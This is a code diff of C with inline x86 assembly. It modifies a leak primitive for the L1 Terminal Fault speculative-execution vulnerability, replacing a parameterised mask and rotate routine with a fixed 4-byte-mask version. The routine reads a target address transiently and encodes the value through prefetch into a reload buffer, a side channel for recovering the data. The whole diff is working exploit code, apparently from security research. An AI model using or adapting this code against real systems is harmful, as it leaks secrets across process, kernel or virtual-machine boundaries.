@@ -70,17 +70,19 @@ asm_l1tf_leak_full(void *leak_addr, full_reload_buffer_t reload_buffer) {
                : "rax", "r12", "r13", "r14");
 }
 
-static inline __attribute__((always_inline)) void asm_l1tf_leak_full_with_mask(
-    void *leak_addr, full_reload_buffer_t reload_buffer, const uint64_t mask,
-    const uint64_t subtract, const uint8_t rotate_right) {
+static inline __attribute__((always_inline)) void
+asm_l1tf_leak_full_4_byte_mask(void *leak_addr,
+                               full_reload_buffer_t reload_buffer,
+                               const uint64_t subtract) {
   asm volatile("xor %%rax, %%rax\n"
+               "movq $0xffffffff, %%r15\n"
                "movl $0xB1ABE849, %%r12d\n"
                "movl $0xCD7E16F1, %%r13d\n"
                "leaq handler%=(%%rip), %%r14\n"
                "movq (%[leak_addr]), %%rax\n"
-               "andq %[mask], %%rax\n"
+               "andq %%r15, %%rax\n"
                "subq %[subtract], %%rax\n"
-               "rorq %[rotate_right], %%rax\n"
+               "rorq $24, %%rax\n"
                "shl $0xc, %%rax\n"
                "prefetcht0 (%[reload_buffer], %%rax)\n"
                "mfence\n"
@@ -90,9 +92,8 @@ static inline __attribute__((always_inline)) void asm_l1tf_leak_full_with_mask(
                "handler%=:"
 
                ::[leak_addr] "r"(leak_addr),
-               [reload_buffer] "r"(reload_buffer), [mask] "r"(mask),
-               [subtract] "r"(subtract), [rotate_right] "r"(rotate_right)
-               : "rax", "r12", "r13", "r14");
+               [reload_buffer] "r"(reload_buffer), [subtract] "r"(subtract)
+               : "rax", "r12", "r13", "r14", "r15");
 }
 
 uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]);
